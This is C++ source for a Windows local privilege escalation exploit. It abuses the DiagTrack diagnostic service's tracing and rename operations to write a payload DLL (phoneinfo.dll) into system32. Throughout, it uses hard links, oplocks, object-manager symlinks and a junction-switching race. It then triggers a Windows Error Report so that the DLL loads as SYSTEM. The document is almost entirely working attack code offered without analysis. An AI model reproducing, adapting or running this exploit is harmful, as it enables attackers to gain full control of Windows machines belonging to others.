int main()
{
   init_apartment();
   static HANDLE exploitationComplete { CreateEvent( nullptr, TRUE, FALSE, nullptr ) };

   try
   {
      auto payloadDestination = "%WINDIR%\\system32\\phoneinfo.dll"_p;
      //Cleanup any traces from any previous executions, enabling reexecution

      fs::remove( payloadDestination );
      if( fs::exists( payloadDestination ) ){
         wcout << to_wide_string( payloadDestination.string() )<< L" already exists, aborting"; return 0;
      }
      try{ fs::remove_all( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\extra"_p ); } catch ( ... ){};
      try{ fs::remove( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\payload.dll"_p ); } catch ( ... ){};

      //If diagtrack service have already created DiagTrack_alternativeTrace we do not have listing permission, so remove known filenames.
      int index=0;
      while( index < 300 )
      {
         if( fs::exists( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\"_p / (L"WPR_initiated_DiagTrack" +  (to_wstring( index ) + L".etl")) ))
            fs::remove( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\"_p / (L"WPR_initiated_DiagTrack" +  (to_wstring( index ) + L".etl")) );
         index++;
      }
 
      fs::create_directories( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\extra\\indirections"_p );

      auto traceConfigFilePath = "%WINDIR%\\system32\\spool\\drivers\\color\\tracing.conf"_p;

      //Create a tracing profile file for diagtrack service to execute
      std::wofstream traceConfig{ traceConfigFilePath.c_str() };

      traceConfig << traceConfigContent;
      traceConfig.close();

      wcout << L"Wrote performance profiler configuration to: "s << to_wide_string( traceConfigFilePath.string() ) << endl;

      NativeWrapper wrap;
      try { wrap.StopCustomTrace(); } catch(...) {} //If a trace is already running stop it

      wrap.StartCustomTrace( L"spool\\drivers\\color\\tracing.conf" );
      wcout << L"Started custom trace session specified by: " << to_wide_string( traceConfigFilePath.string() ) << endl;

      //Write the embedded payload to disk and open handle to create hard links from
      writePayloadToFile(  to_wide_string("%WINDIR%\\temp\\DiagTrack_alternativeTrace\\payload.dll"_p.string()) );

      auto payloadHandle = NT::HANDLE::toExistingFile( "%WINDIR%\\Temp\\DiagTrack_alternativeTrace\\payload.dll"_p ,READ_ATTRIBUTES );
      auto firstEtlFile = "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\WPR_initiated_DiagTrack0.etl"_p;

      //Create the first file diagtrack will rename, also used as a oplock trigger for when rename operations begin
      NT::file::makeHardLink( payloadHandle, to_wide_string( firstEtlFile.string() ) );

      //Each filename diagtrack may use as rename destination requires a matching symlink in "RPC Control" object directory enabling the name to be changed if a rename have "RPC Control" as destination because of a junction folder redirection.
      static std::vector< NT::symlink::symlink< &noLog > > symlinks{};


      //This file is a real logfile, so redirect it somewhere it do not interrupt exploit flow
      symlinks.emplace_back(  L"\\RPC Control\\WPR_initiated_DiagTrackAlternativeLogger_WPR System Collector.etl"s,
                              ( L"\\??\\C:\\windows\\temp\\" + getGUID() ).c_str() );

      //Create lambda that prepares rename of 100 files and reexecutes if no rename was an exploitation succes
      auto prepareRenameBatch = [=]( int offset,auto self ) -> void {
         const int batchSize = 99;
         for(int c = offset; c <= (offset + batchSize) ; c++)
         {
            symlinks.emplace_back(  L"\\RPC Control\\WPR_initiated_DiagTrack"+  to_wstring(c) +L".etl"s,

                                    (L"\\??\\"s + to_wide_string( payloadDestination.string() )).c_str() );

            NT::file::makeHardLink<&noLog>( payloadHandle,
                                    to_wide_string( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\WPR_initiated_DiagTrack"_p.string()) +  to_wstring(c)   +L".etl"s
            );
         }

         wcout << L"Created NTObj symlink and Hard linked from payload for WPR_initiated_DiagTrack["s << to_wstring(offset) << L"-"s << to_wstring(offset + batchSize) << L"].etl"s << endl;

         //When diagtrack open this file check if all renames failed, if so reexecute.
         auto stopFile = NT::HANDLE::toNewFile(
            to_wide_string( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\WPR_initiated_DiagTrack"_p.string()) +  to_wstring(offset + batchSize )+L".etl"s );
         NT::oplock::oplock{stopFile,  [=]( ::HANDLE handle ){
            if( ! fs::exists( payloadDestination ) ) {
               wcout << L"Payload in system32 is not found, no rename operation was success. Trying again" << endl;
               self(offset+batchSize+1,self);
            }
            return false;
         }};
      };
      //First execution, pass reference to self to enable execution of self from inside.
      prepareRenameBatch( 1, prepareRenameBatch );
 
      static HANDLE junctionSwitchingRunning { CreateEvent( nullptr, TRUE, FALSE, nullptr) };
     
      static auto firstEtlFileHandle = NT::HANDLE::toExistingFile( firstEtlFile, FILE_READ_ATTRIBUTES );
      //When diagtrack opens this file we know renaming of *.etl have begun
      NT::oplock::oplock oplockFirstFile{ firstEtlFileHandle , [=]( ::HANDLE handle )
      {
         wcout << "Oplock broke on first file to get renamed: " << to_wide_string( firstEtlFile.string() ) << endl;
 
         //Rename the directory that is parent to diagtracks rename destination folder to a GUID to remove it without having permissions to the dir
         auto renameDestDirParent =  "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\extra"_p;
         auto renameDestDirParentRenamed = "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\"_p / getGUID();
         fs::rename( renameDestDirParent, renameDestDirParentRenamed );
         wcout << L"Renamed "s << to_wide_string(renameDestDirParent.string()) << L" to " << to_wide_string( renameDestDirParentRenamed.string() )<< endl;
           
         //Create new parent directories
         fs::create_directories(  "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\extra\\indirections\\"_p );
         //Create new rename destinationdir and open handle that enables making it a junction
         auto junc= NT::HANDLE::toNewFile(   "%WINDIR%\\Temp\\DiagTrack_alternativeTrace\\extra\\indirections\\snap::$INDEX_ALLOCATION"_p,                                                   FILE_WRITE_ATTRIBUTES );
 
         wcout << L"created replacement directories for the snapshot rename target" << endl;
         //Create thread that in a loop switches the rename destination dir junction between a benign folder and "RPC Control" in NT object ns   
         static shared_ptr< thread > switcher{
            new thread{ [=](){
               try{
                  wcout << L"Created thread that will switch the junction point destination between benign and object manager dir" << endl; 
                  bool fileCreated = fs::exists( payloadDestination );
                  while( ! fileCreated )
                  {
                     static bool pointAtObjLink = true;
                     
                     if( pointAtObjLink )
                        NT::file::makeJunctionByHandle<&noLog>( junc, L"\\??\\Global\\GLOBALROOT\\RPC Control" );
 
                     if( ! pointAtObjLink )
                        NT::file::makeJunctionByHandle<&noLog>( junc,
                                                         to_wide_string("\\??\\%WINDIR%\\Temp\\DiagTrack_alternativeTrace\\extra"_p.string()).c_str() );
                     //The snapshot trace may begin
                     static auto runOnce = SetEvent( junctionSwitchingRunning );
 
                     pointAtObjLink =! pointAtObjLink;
                     fileCreated = fs::exists( payloadDestination );
                  }
                  std::wcout << L"Terminating junction point switching thread," << to_wide_string(payloadDestination.string()) << L" exists so a rename operation was a success. Submitting error report to make Windows load the dll" << endl;
                  //phoneinfo.dll exists so a rename worked, submit an Windows Error Report as that will make Windows load phoneinfo.dll as SYSTEM
                  submitBlankReport();
 
               }catch( exception& e ) { std::wcout << to_wide_string( e.what() ) << endl; }
            }}, []( thread* t ){ t->join();delete t; }    
         };
         //wait till the thread that switches junction points have transformed the folder to a junction point
         wcout << L"Waiting for junctionswitching event" << endl;
         WaitForSingleObject( junctionSwitchingRunning, INFINITE );
         CloseHandle( junctionSwitchingRunning );
 
         return false;
      }}; 
    
      wcout << L"Starting custom snapshot trace " << endl;
      try{ wrap.SnapCustomTraceAsync( "%WINDIR%\\temp\\DiagTrack_alternativeTrace\\extra\\indirections\\snap"_p.c_str() ).get(); }catch(...){};
      wcout << L"Custom snapshot trace complete" << endl;
      SetEvent( exploitationComplete );
   }

   catch( std::exception& e ){ std::cout << e.what() << endl ; }
   catch( winrt::hresult_error& e ){ std::wcout  << e.message().c_str() << endl; }

 
   wcout << "waiting" << endl;
   WaitForSingleObject( exploitationComplete, INFINITE );
   CloseHandle( exploitationComplete );
   wcout << "done" << endl;
}
